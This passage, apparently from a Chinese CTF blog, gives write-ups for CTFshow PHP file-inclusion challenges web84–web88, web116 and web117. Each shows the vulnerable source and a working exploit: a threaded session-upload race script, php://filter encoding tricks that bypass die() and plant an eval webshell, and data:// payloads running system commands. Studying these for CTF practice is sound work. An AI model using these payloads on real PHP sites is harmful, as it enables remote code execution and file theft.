class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第一个post包</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210804205348930.png" alt="image-20210804205348930"></p>
+<p>第二个get包</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210804205414642.png" alt="image-20210804205414642"></p>
+<p>一起开启爆破 得到flag文件名</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210804205455864.png" alt="image-20210804205455864"></p>
+<p>修改脚本 读取flag</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210804205603718.png" alt="image-20210804205603718"></p>
+<p><img src="http://images.5666888.xyz//blog/image-20210804205548412.png" alt="image-20210804205548412"></p>
+<h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    system(<span class="string">"rm -rf /tmp/*"</span>);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是与之前一样 利用条件竞争读取</p>
+<p>这次换个方式 改用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'flag'</span></span><br><span class="line">url = <span class="string">'http://7f361bb4-bfdc-40f2-b785-27c7fd0ce035.challenge.ctf.show:8080/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("cat *.php");?&gt;'</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">'?file=/tmp/sess_&#123;&#125;'</span>.format(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retrying...'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">"&lt;"</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>判断了php开头标签位置</p>
+<p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'flag'</span></span><br><span class="line">url = <span class="string">'http://34620425-6d06-42a7-a9c8-cd0474a728a0.challenge.ctf.show:8080/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("cat *.php");?&gt;'</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">'?file=/tmp/sess_&#123;&#125;'</span>.format(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retrying...'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'还要秀？'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'flag'</span></span><br><span class="line">url = <span class="string">'http://9a5485a7-b096-40d7-a2f9-13ca7edddb77.challenge.ctf.show:8080/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("cat *.php");?&gt;'</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">'?file=/tmp/sess_&#123;&#125;'</span>.format(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retrying...'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<h4 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('大佬别秀了');?&gt;"</span>.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相关知识：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>​                   <a href="https://xz.aliyun.com/t/8163#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/8163#toc-3</a></p>
+<p>死亡exit</p>
+<p>使用base64绕过die函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZionKTs= <span class="comment">//<span class="meta">&lt;?php</span> system('tac f*');</span></span><br></pre></td></tr></table></figure>
+<p>在base64语句前随便加两个字符 凑够phpdiexx 可以被base64解码</p>
+<p>剩下的PD9waHAgc3lzdGVtKCd0YWMgZionKTs= 正常被解码然后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs=</span><br></pre></td></tr></table></figure>
+<p>urldecode($file)</p>
+<p>浏览器解码一次 函数解码一次</p>
+<p>所以需要对file进行二次url编码</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210810150446961.png" alt="image-20210810150446961"></p>
+<p><img src="http://images.5666888.xyz//blog/image-20210810150517046.png" alt="image-20210810150517046"></p>
+<p>然后访问php文件即可看到flag （ 也可以写一个一句话木马进去）</p>
+<h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>get方式接收file参数 过滤了很多符号 如果能够通过匹配就被包含</p>
+<p>和79题差不多 但是这里过滤了等号  base64中=是用来填充的 可以去掉</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgKicpOw  <span class="comment">//<span class="meta">&lt;?php</span> system('tac *');</span></span><br></pre></td></tr></table></figure>
+<h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>打开网页是一段视频</p>
+<p>用foremost提取出一张图片</p>
+<p><img src="http://images.5666888.xyz//blog/00080067.png" alt="00080067"></p>
+<p>直接查看flag.php</p>
+<p> file_get_contents可以直接读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//85a4a1cb-1bc9-4085-b47d-207e3bb654ae.challenge.ctf.show:8080/index.php?file=flag.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>死亡exit</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure>
+<p>需要绕过die  过滤了常用的base64和rot13</p>
+<p>换一个编码方式  <a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php" target="_blank" rel="noopener">php支持的字符编码</a></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">    ?file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">POST</span><br><span class="line">    contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br><span class="line">URL/<span class="number">1.</span>php</span><br><span class="line">    <span class="number">1</span>=system(<span class="string">'tac f*'</span>);</span><br></pre></td></tr></table></figure>
+<p>### </p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/29/CTFSHOW-web入门-命令执行/" rel="next" title="CTFSHOW-web入门-命令执行">
+                <i class="fa fa-chevron-left"></i> CTFSHOW-web入门-命令执行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/29/CTFSHOW-web入门-php特性/" rel="prev" title="CTFSHOW-web入门-php特性">
+                CTFSHOW-web入门-php特性 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web78"><span class="nav-number">1.1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web79"><span class="nav-number">1.2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web80"><span class="nav-number">1.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web81"><span class="nav-number">1.4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web82"><span class="nav-number">1.5.</span> <span class="nav-text">web82</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web83"><span class="nav-number">1.6.</span> <span class="nav-text">web83</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web84"><span class="nav-number">1.7.</span> <span class="nav-text">web84</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web85"><span class="nav-number">1.8.</span> <span class="nav-text">web85</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web86"><span class="nav-number">1.9.</span> <span class="nav-text">web86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web87"><span class="nav-number">1.10.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web88"><span class="nav-number">1.11.</span> <span class="nav-text">web88</span></a></li><li 